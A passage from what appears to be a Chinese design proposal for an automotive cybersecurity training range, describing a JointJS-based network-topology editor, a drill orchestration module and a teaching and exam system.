chart、FSA、UML、PN、DEVS、LDM等。图形中的对象可以被拖动，并能够保持创建时的层次结构，此外还在每一层级提供了一些回调函数。网络拓扑编辑的操作如下图所示。网络拓扑支持图分层式节点聚合和滚动式缩放，在节点的数量上支持等于10000个节点的编辑。对编辑完成的拓扑图可支持导入导出的操作，支持网络拓扑图保存为一个可重复使用的模板。系统允许您通过鼠标拖拽或点击来选择设备、配置其属性和编辑设备间的连接关系，同时支持保存和加载这些配置。网络配置以模板的形式进行存储，并配备了一个针对标准网络目标或实验场景的配置模板库，用于简化和加速配置过程。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/ba728525bf95c17c3b222c9244d16fb2.png"></p><p>网络拓扑可视化编辑</p><p>JointJS应用在本项目的可视化编辑模块主要用到一下功能。</p><p>加载JointJS库</p><p><a href="http://www.jointjs.com/download">官网</a>中下载joint.js和joint.css或其他已经定义好的图形库，并在页面中添加。</p><p>创建画板</p><p>首先，我们需要一张可以在上面作画的纸，JointJS中一个图像模型就是一个joint.dia.Graph 的模型实例，其他的子模型都必须包含其中,但单单定义图像模型还不够，只有将图像模型附加到joint.dia.Paper模型中，才能显示对应的图像，Graph就像是在我们脑子中的构思一样，我们需要将他画在纸Paper上。实现画板的代码如下：</p><p>var graph=new joint.dia.Graph;</p><p>var paper=new joint.dia.Paper({</p><p>el:$(“#demo”), //指明了当前图像需要显示在页面的什么地方</p><p>width:800,</p><p>height:600,</p><p>gridSize:10,</p><p>perpendicularLinks:true,</p><p>model:graph</p><p>});</p><p>添加连线</p><p>JointJS通过joint.dia.Link添加一个连线；每个实例对象都是graph模型的cell，必须通过graph.addCell()添加到模型中以便显示出来。除了初始化外，我们也可以通过 element.attr()方法去为特定的对象添加样式，element.attr()的方法接受一个对象类型的参数，对象的Key是匹配SVG DOM元素的CSS选择器。实现连线的代码如下：</p><p>var link=new joint.dia.Link({</p><p>attrs: {</p><p>‘.connection’: { stroke: ‘#000000’ },</p><p>‘.marker-target’: { d: ‘M 10 0 L 0 5 L 10 10 z’ }</p><p>},</p><p>source: { x:325,y:150},</p><p>target: {x:400,y:125}, vertices:[{x:100,y:150},{x:100,y:450},{x:700,y:450},{x:700,y:150},{x:600,y:150},{x:600,y:50},{x:400,y:50}]</p><p>});</p><p>添加元素</p><p>我们可以利用JointJS已经定义的元素实现网络拓扑图中比较简单的元素，例如主机等。</p><p>添加自定义元素</p><p>很多时候，现有的元素(joint.shapes.basic.Rect、 joint.shapes.basic.Circle、……)并不能满足我们的需求，我们也可以自定义一些元素，自定义的元素其实是通过多个 SVG节点联合构建而成的，现在就让我们先定义一个路由器元素，网络拓扑图中的路由器为一个圆形及两条相交的线段构成的图形。实现路由器元素的js代码如下：</p><p>var k=12.5*Math.pow(2,0.5);</p><p>joint.shapes.basic.Bulb = joint.shapes.basic.Generic.extend({</p><p>markup: ‘’,</p><p>defaults: joint.util.deepSupplement({</p><p>type: ‘basic.Bulb’,</p><p>size: { width: 50, height: 50 },</p><p>attrs: {</p><p>circle: { cx: 25, cy: 25,r:25, fill: ‘white’, stroke: ‘black’},</p><p>‘.bulb_line1’:{</p><p>stroke: ‘black’,x1:25-k,y1:25-k,x2:25+k,y2:25+k</p><p>},</p><p>‘.bulb_line2’:{</p><p>stroke: ‘black’ ,x1:25-k,y1:25+k,x2:25+k,y2:25-k</p><p>}</p><p>}</p><p>}, joint.shapes.basic.Generic.prototype.defaults)</p><p>});</p><p>目标网络环境的网络拓扑编辑提供了诸多功能：树形展示使得快速查找和定位节点变得简单，同时支持通过虚拟机名称搜索定位；鹰眼展示功能可以放大缩小拓扑图并保持位置同步移动；滚动式缩放与分层式节点聚合提升了拓扑编辑的灵活性和可视化效果；目录展示和快速查找节点功能有助于有效管理复杂网络；设备复制功能支持快速复制和配置设备；多选与移动功能使得批量操作更加高效；展示虚拟机连线的IP地址增强了连接的可视化；分组和解组功能以及节点和子网属性的查看提供了更详细的信息；拓扑编辑界面记录节点和配置的修改，并支持配置操作撤销；旁路设备的配置实现了指定端口流量的便捷管理。</p><h2 id="试验导调模块"><a href="#试验导调模块" class="headerlink" title="试验导调模块"></a>试验导调模块</h2><ul><li>支持试验流程中的步骤详细定义，支持在步骤中定义具体需要执行的导调任务；至少包含以下15种流程的创建：攻防演练流程、众测流程、安全目标导入流程、零部件测试流程、整车测试流程、HIL测试流程、VIL测试流程、MCU靶标开发流程、MPU靶标开发流程、E/E架构通信网络靶标开发流程、车联网安全场景靶标开发流程、应急响应流程、漏洞验证流程、周期性测试流程、运维管理流程；并显示这些流程与汽车研发流程的关联关系；</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/0a3f56d0798b1b08379204f02ae037e7.png"></p><p>实验流程步骤定义</p><p>为了适应汽车行业试验流程中的高标准要求，本系统提供支持详细定义各试验步骤的功能。在各个步骤中，用户可以明确规定所需执行的导调任务，包括具体的操作、参数配置、数据记录和结果验证等。</p><p>系统至少支持以下15种流程的创建：</p><ul><li>攻防演练流程：此流程涉及模拟攻击与防御场景，评估车载网络系统的安全性能。</li><li>众测流程：利用大量的外部测试者来进行软件或硬件的测试，以识别潜在的缺陷和弱点。</li><li>安全目标导入流程：确立测试的安全标准与目标，并将其导入测试平台中。</li><li>零部件测试流程：对单个汽车零部件进行性能与安全测试。</li><li>整车测试流程：对整辆车进行全面的测试，包括安全功能和车辆性能。</li><li>中执行系统测试。</li><li>路与交通环境中进行测试。</li><li>MCU靶标开发流程：针对微控制器（MCU）的安全靶标开发，以测试其弱点和抵抗能力。</li><li>MPU靶标开发流程：开发微处理器（MPU）相关的安全靶标。</li><li>E/E架构通信网络靶标开发流程：创建电子/电器架构中的通信网络安全测试靶标。</li><li>车联网安全场景靶标开发流程：为车联网环境中潜在的安全威胁开发测试场景。</li><li>应急响应流程：在发现安全事件时执行的快速响应操作。</li><li>漏洞验证流程：确认和验证报告中的潜在安全漏洞。</li><li>周期性测试流程：规划并执行定期测试程序，保障系统长期安全性能。</li><li>运维管理流程：涉及日常运行维护活动，包括更新、修补和状态监控。</li><li>系统还能够展示这些流程与汽车研发流程间的关联关系。通过直观的图表和线路图，研发人员可以清晰看到各个流程如何插入到汽车研发的各个阶段，确保安全测试与整体的研发工作同步进行，提高研发效率，降低风险。</li></ul><p>这种详尽的流程定义和管理功能，不仅可以确保试验流程的准确性和有效性，还可以通过整合与相关的研发活动，为汽车生产过程的每一环节提供支持。这样的系统配备已成为汽车行业迈向更先进、更安全产品的关键技术支持。</p><ul><li>支持导调流程顺序、执行状态展示，还包含显示步骤类型、开始结束方式、创建人、创建时间等信息，提供产品功能截图证明。</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/37597d90f4c4a6b32f1eeec8a2dfb268.png"></p><p>功能参数设计为，系统支持试验流程中步骤的详细定义，包括在步骤中定义具体需要执行的导调任务。系统能创建15种流程，如攻防演练、众测、安全目标导入等，并显示这些流程与汽车研发流程的关联。试验过程流程的设计可以将整个试验拆解为一系列有序步骤，并构建试验中依赖的前提条件。系统还控制试验过程流程及进度，确保训练过程按顺序运行。</p><p>系统支持设定任务执行方式，可为人工或自动执行，并允许在流程中进行导调任务的顺序编排。导调步骤中可加入临机任务，并对其进行单独启动和停止控制。支持向临机任务下发控制指令，每个试验场景支持下发10条临机任务。导调任务还支持控制自动化相关行为，通过自动化命令执行任务产生攻击事件，用于攻防技能训练。</p><p>系统在导调过程中可加入临机任务进行灵活导调，支持对任务执行的启动、停止操作。导调流程顺序、执行状态的展示功能包括步骤类型、开始结束方式、创建人、创建时间等信息展示。虚拟节点通过非网络接口写入配置文件或命令脚本，实时读取内部日志或文件，并控制执行命令或脚本。</p><p>导调控制引擎支持对导调任务的启停控制，导调数据通道任务能建立指定虚拟网络到外部管理网络的数据交互通道，支持多种协议。系统允许在导调任务中配置试验人员操作的虚拟或实物设备，并根据试验情况开启录屏。</p><p>性能参数设计为，系统在一个导调流程中支持10个步骤，每个步骤可执行10个任务。系统能够同时配置和调度100个任务，确保高效率和灵活性的试验和导调过程。</p><h4 id="方案设计-2"><a href="#方案设计-2" class="headerlink" title="方案设计"></a>方案设计</h4><p>1. 试验流程定义与管理</p><p>本系统支持试验流程中的步骤详细定义，允许用户在步骤中定义具体需要执行的导调任务。系统包含以下15种流程的创建功能：</p><ol><li>攻防演练流程</li><li>众测流程</li><li>安全目标导入流程</li><li>零部件测试流程</li><li>整车测试流程</li><li>HIL测试流程</li><li>VIL测试流程</li><li>MCU靶标开发流程</li><li>MPU靶标开发流程</li><li>E/E架构通信网络靶标开发流程</li><li>车联网安全场景靶标开发流程</li><li>应急响应流程</li><li>漏洞验证流程</li><li>周期性测试流程</li><li>运维管理流程</li></ol><p>并且系统能够显示这些流程与汽车研发流程的关联关系。</p><p>2. 试验过程流程设计与管理</p><p>系统支持试验过程流程的设计，能够将试验的整个过程拆解成一系列有序的步骤进行管理，并能够将试验过程中依赖的前提条件通过流程中设计的骤进行构建。</p><p>3. 试验过程流程及进度控制</p><p>系统支持试验过程流程及进度的控制，并能够控制训练过程按照编排的顺序有序的运行。</p><p>4. 任务执行方式设定</p><p>系统支持设定任务的执行方式，能够设定为人工或者自动执行。</p><p>5. 导调任务执行顺序编排</p><p>系统支持流程中导调任务的上移、下移等执行顺序的编排操作。</p><p>6. 临机任务管理</p><p>系统设计中集成了灵活的任务调度和控制功能，以便在导调（演练和练习的指挥与控制）过程中，即时添加和管理临机任务。这项功能针对的是在预配置的试验或操作场景中突然出现需要立即响应的任务，确保即使在复杂的操作中也能保持高度的适应性和响应速度。</p><p>特别是，系统提供了对临机任务的单独启动和停止控制。这意味着这些任务可以独立于主流程进行管理，允许用户在不影响整体流程的前提下，启动或暂停特定的任务。</p><p>每个试验场景都支持最多10条临机任务的下发。系统通过一个直观的用户界面或控制台，允许用户指定、排队和下发这些任务，提供了实时的灵活性。对于管理这些临机任务，系统支持的控制指令包括，但不限于：</p><p>- 启动：让选定的临机任务开始执行。</p><p>- 停止：暂停或完全终止临机任务的执行。</p><p>- 恢复：在任务被暂停后恢复执行。</p><p>- 下一步：将任务流程推进到下一阶段或步骤。</p><p>7. 自动化导调任务</p><p>导调任务支持控制自动化相关行为，能够通过定义自动化命令执行任务产生相关攻击事件，用于攻防技能训练。</p><p>8. 导调流程管理</p><p>系统支持导调流程顺序、执行状态展示，还包含显示步骤类型、开始结束方式、创建人、创建时间等信息，并提供产品功能截图证明。</p><p>9. 虚拟节点非网络接口操作</p><p>虚拟节点能够通过非网络接口将配置文件或命令脚本写入虚拟节点指定位置；能够通过非网络接口实时读取虚拟节点内部日志或文件；能夜通过非网络接口控制虚拟节点执行命令或脚本，并能获取执行结果。</p><p>10. 导调控制引擎</p><p>支持导调控制引擎对导调任务的启停控制。</p><p>11. 导调数据通道任务</p><p>导调数据通道任务能够建立指定虚拟网络到外部管理网络的数据交互通道，便于试验行为或者结果的获取。数据通道支持TCP、UDP、ICMP等3种以上协议。</p><p>12. 试验设备操作配置</p><p>支持在导调任务中对试验人员能够操作的虚拟或实物设备进行配置，并支持根据具体试验情况是否开启录屏。</p><p>性能设计</p><p>1个导调流程中支持10个步骤，每个步骤支持10个任务的执行能力；</p><p>支持同时配置和调度100个任务。</p><h4 id="方案简介"><a href="#方案简介" class="headerlink" title="方案简介"></a>方案简介</h4><p>安全测试包括以下三个阶段：a)试验准备阶段：主要完成试验想定以及环境部署等； b)试验运行阶段：主要是对试验状况的监控以及对试验的控制；c)试验完成阶段：主要完成资源的释放以及对试验数据的归档。</p><p>试验导调模块提供试验创建、试验查看、试验想定、试验下发、试验部署进度监控、试验过程控制和监视、试验归档等功能的资源调度，总体要求如下： a) 提供面向多靶场协同工作的试验演练的统一管理，提供多靶场协同的试验演练并发调度；b) 提供靶场能力、靶标及场景资源、攻防工具资源等的统一描述；c) 提供面向多靶场协同的各类资源注册和管理； d) 提供面向多靶场的任务全生命周期的实时监控能力； e) 支持多靶场协同的想定方案快速生成、校验和资源预约； f) 支持多靶场协同试验的统一控制：支持分布式统一资源管理和试验控制，支持对分靶场的资源进行统一管理，支持接收来</p><p>试验导调模块负责用户对任务的资源和人力的分配，支持试验人员的加入及试验环境的授权访问，支持试验人员退出及取消实验环境的访问权限；支持试验人员的试验信息的访问控制和试验环境的访问控制；每个试验的参试用户在200个以上。</p><p>虚拟节点支持通过非网络接口进行操作，包括将配置文件或命令脚本直接写入到指定位置，实时读取节点内的日志或文件。还可以通过同一接口执行控制指令或脚本，运行命令，并实时获取这些操作的执行结果。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/07b67a317a0ed98d753270274958c912.jpeg" alt="WPS图片3"></p><p>试验文件管理</p><p>客户端登录后控制中心获取其认证信息，认证通过后下发当前客户端用户的授权信息（角色）及链路使用规则，然后根据用户提交的角色需求控制中心动态规划出符合用户需求的链路发往客户端。客户端根据该链路创建链路并进行匿名会话，若创建失败，客户端会标记出现异常的节点，上报至控制中心。试验的开放并允许试验人员登录试验环境中的主机，支持暂停与停止并中断试验人员对试验环境中的主机的访问。</p><p>虚拟网络导调子系统支持基于容器化部署，可通过Web页面查看系统信息，包括监控系统集群节点负载情况，节点状态以及节点资源使用率统计，监控平台容器Pod的虚拟节点具备通过非网络接口与虚拟节点进行交互的能力。包括利用非网络接口将配置文件或命令脚本写入虚拟节点的特定目录中，这样做便于对虚拟节点进行灵活的配置和管理。另外，虚拟节点还可以通过非网络接口实时读取节点内部的日志或文件，实现对节点运行状态的实时监测与数据收集；实现通过非网络接口控制虚拟节点或脚本、执行命令，并获取执行结果，并能获取执行结果（提供系统功能截图）；状态、运行时间、重启次数、CPU使用核数，内存使用情况等信息如下图所示。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/3b8c64f1d0a5ca57a3c41578f9a29d17.png"></p><p>虚拟节点导调管理</p><p>支持试验流程的详细定义和管理。用户可以定义试验步骤，并在每个步骤中定义具体的导调任务，以实现对试验过程的精细化控制和管理。试验流程可以将整个试验过程拆解为有序的步骤进行管理，通过设计的步骤可以构建试验过程中的前提条件和依赖关系。系统支持对试验流程和进度进行控制，确保训练过程按照预定顺序有序运行。用户可以设定任务的执行方式，可以选择人工或自动执行。导调任务可以在流程中进行灵活编排，支持上移、下移等操作。临机任务可以单独启动和停止，并在界面上进行可视化展示和高亮显示。用户可以向临机任务下发控制指令，如启动、停止、恢复、下一步等。导调任务在系统中提供自动化控制功能，允许用户通过设置自动化命令来执行特定的任务，包括模拟攻击事件，以便开展攻防技能的培训。系统设有导调数据通道，能够建立虚拟网络与外部管理网络之间的数据交换通道，这对于捕获实验行为和成果至关重要，并且支持包括TCP、UDP、ICMP在内的多种协议。系统还提供了一系列配置选项，包括数据采集、实验设备设置和录屏功能，以适应不同的实验场景。导调任务的整个流程、顺序以及执行状态都有直观的展示，显示了任务步骤、启动结束方式、创建者和时间等详细信息。导调控制引擎则负责任务的启动和终止。系统以其强大和灵活的功能，支撑详细的试验流程定义和控制，使用户能够有效进行攻防训练和模拟演习。</p><h2 id="网络安全攻防与汽车测评教学培训模块"><a href="#网络安全攻防与汽车测评教学培训模块" class="headerlink" title="网络安全攻防与汽车测评教学培训模块"></a>网络安全攻防与汽车测评教学培训模块</h2><ul><li>支持集中授课培训模式，支持教员讲课、学员实操、以及讲课与实操混合三种方式的教学，提供产品功能截图证明；</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/ce55362ab958f1eaf6bbc7dde90ed4f8.png"></p><p>教员讲课及讲课与实操</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/0661323118c6079b9aeb22b5886f9461.png" alt="1703512451886">学员实操界面</p><ul><li>混合模式支持讲课模式与实操模式的动态切换，学员可观摩教员的教学虚拟机界面，切换后学员可登录自己的环境进行操作，提供产品功能截图证明；</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/ac7d34ff37c619fdf0835ad839328c97.png"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/e66c0b57d88aba0a5a09d005fb58a955.png"></p><p>功能参数设计为，系统支持实验自定义及课程的标签分类，允许按章节编排实验。实现集中授课培训模式，包括教员讲课、学员实操和讲课与实操混合三种教学方式。系统具备学员管理功能，教员可以组建教学组，排定教学计划。实验环境可按计划自动部署，教员也可手动批量部署和管理实操环境。教员讲课模式中，教员可分享操作屏幕给学员观摩。实操模式下，教员能实时查看学员登录实验环境和操作过程。混合模式支持讲课模式与实操模式的动态切换，学员可观摩教员教学虚拟机界面和登录自己的环境进行操作。</p><p>系统支持设置教学实操环境的保留时长，动态控制环境资源保留时间。学员可上传课后实验报告，教员负责统一审核与评级。培训过程中支持教员和学员的私聊和群聊。技能树功能允许教员配置技能树，指定给学员进行学习。实验可设为“自学实验”和“教学实验”。学员可根据提供的视频实验、课件实验、实操实验等内容进行自学，配套测试题。实操实验提供虚拟环境、指导书和讲解视频等内容。根据岗位、专业方向配置技能树，提供自学路线，显示学习进度。支持学员按技能树设定路线进行学习。</p><p>视频笔记功能允许学员保存视频播放位置的截图，并添加文字说明。视频笔记支持统一查看，自动播放锚定位置。学员可管理实操实验的虚拟环境，包括手动销毁与自动销毁实验环境，推迟销毁环境。支持学员对课程实验进行星级评定。提供考试题库管理，包括客观题和实操题，客观题类型包括单选、多选、判断、填空。试卷中题目支持实操题和多个Flag的题目。有实操题目的试卷，学员可访问实操环境或下载附件进行解题。提供试卷管理功能，基于题库快速生成试卷，自定义生成试卷并设置分数。教员可设计试题，进行题目编辑、答案编辑，将试题库按门类、难度划分。支持教员进行集中考试，设定考试计划，自动开始。提供不同试卷内容的考试，支持同一考试题目分类相同但实际题目不同的考试。有实操环境的试卷，学员可解题。考试提供自动阅卷功能，支持查看答题详情，教员统一发布成绩，学员可查看考试得分细节和试题正确答案及解析。考试报告自动生成，包含学员平均成绩、题型、方向、难易程度、答题趋势等内容。支持学员根据试卷库自测，结果自动验证评分，提供题目解析。教师可针对考试详情进行点评，点评内容体现在考试报告中。学员可选择参与的考试生成整体报告，报告统计考试试卷构成和答题情况。支持实操实验全内容的设计与管理，包括实操环境、靶标机、指导书、课件、视频、试题等内容。指导书支持在线编辑，图片在线导入和拷贝、样式编排，添加试题等内容配置。</p><p>性能参数设计为，系统支持基于实验模板、基础模板、实验、镜像等4种方式自定义实操实验。支持实验指导书文档的导入，格式包括doc、pdf、md等。支持3种培训课件类型，包括doc、pdf、ppt等，支持课件内容在线预览。培训并发用户数支持达到200人。网络安全培训课件总量为1000个，内置700个，验收后三年内更新300个。知识理论考核题目总量为10000道，内置5000道，验收后三年内更新500道。</p><h4 id="方案设计-3"><a href="#方案设计-3" class="headerlink" title="方案设计"></a>方案设计</h4><p>1. 实验自定义与课程管理</p><p>支持实验以及课程的标签分类。</p><p>课程可按章节编排实验，提供实验模板管理。</p><p>支持课程和实验的自定义，包括实验环境、指导书、视频等。</p><p>2. 教学模式支持</p><p>支持集中授课培训模式：教员讲课、学员实操、讲课与实操混合三种方式。</p><p>教员讲课模式下，支持屏幕共享功能。</p><p>实操模式下，教员能实时查看学员操作。</p><p>混合模式下，支持讲课与实操的动态切换。</p><p>3. 学员与教学组管理</p><p>教员可创建、管理教学组。</p><p>支持教学计划的排定与管理。</p><p>实验环境可按计划自动部署或由教员手动批量管理。</p><p>4. 实操环境管理</p><p>支持实验环境的保留时长设置。</p><p>学员可上传实验报告，教员进行审核与评级。</p><p>支持学员对实操环境的手动销毁与自动销毁，以及销毁延期。</p><p>5. 交流与评价</p><p>支持教员与学员间的私聊和群聊。</p><p>学员可对课程实验进行星级评定。</p><p>6. 技能树与自学支持</p><p>支持技能树功能，教员可配置并指定给学员。</p><p>支持学员按技能树设定的路线自学。</p><p>提供自学实验内容，包括视频、课件、实操等。</p><p>7. 考试与测试管理</p><p>提供题库管理，包括客观题与实操题。</p><p>支持试卷的快速生成与自定义。</p><p>支持考试计划设定与集中考试。</p><p>提供试卷自动阅卷与成绩发布。</p><p>支持学员自测，自动验证评分与解析。</p><p>8. 教学内容与资源管理</p><p>支持实操实验全内容的设计与管理。</p><p>支持指导书的在线编辑与样式编排。</p><p>支持实验指导书、课件类型的导入与在线预览。</p><p>性能参数要求</p><p>支持自定义实操实验的多种方式（实验模板、基础模板等）。</p><p>支持实验指导书的多格式导入（doc、pdf、md等）。</p><p>支持培训课件类型的多样性（doc、pdf、ppt等），并支持在线预览。</p><p>平台支持200人的并发用户数。</p><p>网络安全培训课件总数达1000个，700个内置，三年内更新300个。</p><p>知识理论考核题目10000道，5000道内置，三年内更新500道。</p><p>本方案聚焦于提供一个全面的教学与实验管理平台，旨在满足多样化的教学需求，并提供高效、互动的学习环境。平台设计考虑了教学内容的多样性、学员管理的便捷性、实操环境的灵活性以及考试与评价的全面性。性能参数确保平台能够支持大规模的用户并发访问，以及丰富的教学资源和题库管理。</p><h4 id="方案简介-1"><a href="#方案简介-1" class="headerlink" title="方案简介"></a>方案简介</h4><p>培训模块主要提供网络安全实验的培训实操环境，全面支持自学、教师教学、实操教学和考试三种模式。用户可以登录到实验环境中进行操作，通过自学的方式进行训练。支持教员邀请和添加学员账号，成立班级，统一管理，发送通告。</p><p>系统以课程、实验以及考试的方式向用户提供培训服务，其中课程包含有多个实验，学员可以根据实验提供的视频、指导书等资源在实操环境下进行学习。考试则包含多个客观题目以及多个实操环境题目，学员在规定时间内进行答题。</p><p>教学培训主要有自主训练、训练教学两种实训的业务形式，自主训练方式是学员根据教学培训分系统提供大量的实训课程及实验，并结合自身的知识结构及兴趣爱好，选择系统中提供的内容进行自学，从而达到对自身网安技能进行强化或补漏的目的。自主训练模式下用户能够对自学实训的环境进行部署、销毁的管理，并实操环境也能根据系统设置的时间限制自动进行资源的释放。训练教学方式是教员按照教学要求利用教学培训分系统进行实验排课和考试，测试学员的各种基础能力、前期的学习成功等。</p><p>教学培训分系统还提供实训内容的设计功能，具备课程信息管理、实验指导书管理、实验环境管理、支撑按需定制内容的实操训练和考试等功能。</p><p>按照业务流程，教学培训分系统架构如下图所示，可以分为两个层面：业务层和支撑层。</p><p>业务层有三个主要功能，一是自学模块、二是教学模式、三是技能考试。自学练习提供了学员员自己按照自身需求进行学习的能力，融合了实验自学和视频自学，学员员可以按照特定关键词、特定网络安全分类进行实验的选择，启动特定实验、接入特定实验进行练习；排课授课提供了教官对参训人员的统一授课能力，设计师进行课程设计、规划排课日程、定制环境计划并且在授课期间进行模式切换；知识考试提供了试卷制定、考试排期、考分统计和生成报告的功能。</p><p>教学培训分系统由4个模块组成，自学模块、教学模式、技能考试模块和实验环境管理。自学模块主要面向有自主学习培训需求的学员提供自助式学习支撑，学员可以检索、查看、选择培训课程，选择后即可对需要实验环境的实验进行环境部署，在实验环境快速构建完毕之后开始在系统提供的实操环境中进行学习实操，无需培训教师的集中管理。</p><p>在学员员培训实践过程中，可以阅读实验指导书，观看实验视频，对有实操环境的实验，学员可以通过SSH、RDP、VNC等协议的Web方式访问虚拟机。通过Web接口，用户能够远程连接到虚拟机，执行复制粘贴操作，上传文件，以修复安全漏洞。培训实操环节中，无需培训老师干预，学员员可以自行创建实验环境，获得访问实验环境的访问入口。登录实验环境后能够在该用户权限内进行各种实验操作。实验完成之后，学员可以手动将实验环境进行销毁，并且实验环境可根据预设的预计实验时长自动销毁，防止资源长期占用。自主训练模块允许学员根据个人需求定制训练计划，从课程内容、安全领域到难度级别等多个方面挑选最适合自己的课程。</p><p>排课考试模块负责提供教员员对学员员的教学进行排课授课及课程设计与管理能力。学员员所在在的班级和学科各不相同，编排起来工作量大，且费时费力，排课时若没有严格和周密的计划，所排出课表极容易引起冲突，甚至于严重影响到正常教学活动的进行。这就需要有一个较为实用的排课系统使排课工作更加的高效化、人性化。本排课考试模块教师通过自动分配环境、自动开放实验、自动停止实验以及销毁环境，从而达到充分利用教学资源的目的。教学模式为授课人员提供便捷的课程管理的功能，授课人员可以进行课程的设计、课程的排期、课程环境的自动管理，以及授课过程中的模式切换等操作。</p><p>系统提供了一个多功能的培训支持平台，具体功能包括以下几个方面：</p><p>1）课程设计：设计人员有能力通过该系统来构建课程，这意味着他们可以将多个相关联的实验链接起来，以形成一个结构化的课程。这种设计增添了课程的系统性，使得学习过程呈现出自然的递进关系，有助于受训人员对知识的逐级掌握，深化对网络安全知识的理解。</p><p>2）课程排期：通过一个日历视图界面，授课人员能够灵活地安排课程。可以为特定的日期和时间段安排课堂，确保教学活动按预定计划进行。课程排定后，受训人员能够在系统中查看自己的上课时间表，从而方他们规划学习计划。</p><p>3）环境管理：一旦课程排定，系统将自动调度所需的环境资源。包括创建、接入和销毁实验环境的任务将被安排进入任务队列，并在预定时间自动触发执行。这保证了学习环境在需要时得到有效的分配和整备。</p><p>4）模式切换：在授课过程中，系统允许授课人员在讲授和实操模式之间自由切换。在讲授模式下，所有受训人员共同观看授课人员展示的屏幕，而在实操模式下，每位受训人员可进入自己的专属环境中进行操作。此外，授课人员能够实时监控每位受训人员的操作情况，这可以提高学习效率并及时给予反馈。</p><p>系统旨在提供一个完善的网络安全教育和训练平台，确保受训人员能够在结构化、互动化的环境中获得最佳的学习体验。</p><p>技能考试模块为授课人员提供了理论题考核的能力。授课人员可以首先定制试卷，之后进行考试排期，并在考试中实时查看进度，并最后查看考试的整体报告。</p><p>1）试卷制定：系统提供授课人员创建试卷的能力，可以制定试卷名称、难度、描述，并手动或者自动选择题目。题目包含单选、多选和判断三种类型。</p><p>2）考试计划：授课人员创建一个考试，填入名称、配置人员、配置时间、选择试卷后，考试即可等待进行。考试进行中，学员答题界面进行答题。</p><h4 id="自学模块"><a href="#自学模块" class="headerlink" title="自学模块"></a>自学模块</h4><p>靶场环境提供一个多功能的学习平台，旨在适应教学和自学需求。对于教师而言，它支持在线授课，使他们能够上传和分享视频讲解和课件。而学生则可以通过观看视频、阅读课件来自行学习，并可直接进入系统进行实际操作练习。该平台支持主流的视频和文本文件格式，确保与工商银行现有的课程资源兼容，便于整合现有教育内容，并为学习者提供一个无缝的学习体验。</p><h5 id="自学练习流程"><a href="#自学练习流程" class="headerlink" title="自学练习流程"></a>自学练习流程</h5><p>自学练习流程包含教员部分和学员部分。</p><p>在实验创建的过程可以设置试验方向、试验类型、试验难度、时长，选用合适的视频、工程模板和指导书。课程创建可设置课程方向、课时、选择实验，设置课程难度。</p><p>学员可在自学练习功能观摩视频、自学实验、自学试验，并且支持按照难度、类型、方向筛选，支持根据学习进度筛选课程。</p><p>自学模块由实验检索展示模块、实验进行模块、实验记录分析模块和实验统计模块组成。</p><h5 id="实验检索展示"><a href="#实验检索展示" class="headerlink" title="实验检索展示"></a>实验检索展示</h5><p>实验检索展示模块用于展示自主训练模块中所有的训练实验环境并提供多种搜索方式，便于学员浏览和查询自己所需的学习内容。学员员可以按照实验分类进行实验选择，也可通过关键词进行搜索，或者按照实验的方向进行体系化的学习。</p><p>学员能够基于系统提供的课件进行自主学习，提供实验按类型、关键字进行查找并订阅，能够自主分配实操环境。如下图所示：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/5367b7bcf53b82b5c3b189df95a35274.png"></p><p>我的上课</p><h5 id="实验操作进行"><a href="#实验操作进行" class="headerlink" title="实验操作进行"></a>实验操作进行</h5><p>实验操作进行模块为学员提供实验实操和学习的核心支撑。主要包含了实验视频、实验指导书展示、虚拟环境创建、虚拟机接入、虚拟机销毁等功能。学员能够根据实验提供的视频进行学习，支持学员针对学习的实验随堂答题，并查看试题答案与解析。</p><p>1）学员能够对系统内自主学习的视频查看，支持用户按视频类型、难易程度，名称等进行视频的检索。</p><p>支持视频观看学习功能并可全屏播放观看视频，能够对选中的视频进行播放，并记录播放历史。对观看完的视频会标记为已学习。没完成的标记为学习中。用户也能对视频的喜好程度进行点赞。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/c13c82bc2cd3037454e4c80d0dd3e421.png"></p><p>视频播放</p><h5 id="实验记录分析"><a href="#实验记录分析" class="headerlink" title="实验记录分析"></a>实验记录分析</h5><p>实验记录分析模块根据学员员的学习数据进行多维度的分析和挖掘，提供多种分析展示方式和生成学习评估报告，并能根据学员员的学习数据进行实验推荐、学习路径推荐、岗位规划推荐等，实验记录分析模块可按照多种分类生成学员员的各种学习曲线，以及其他表现形式，使得学员员可以对自身的学习历程和能力有直观准确的认识。支持用户自主学习路径的查看，系统能够对学员的学习历史记录进行分析统计。</p><h4 id="教学模式"><a href="#教学模式" class="headerlink" title="教学模式"></a>教学模式</h4><h5 id="排课授课流程"><a href="#排课授课流程" class="headerlink" 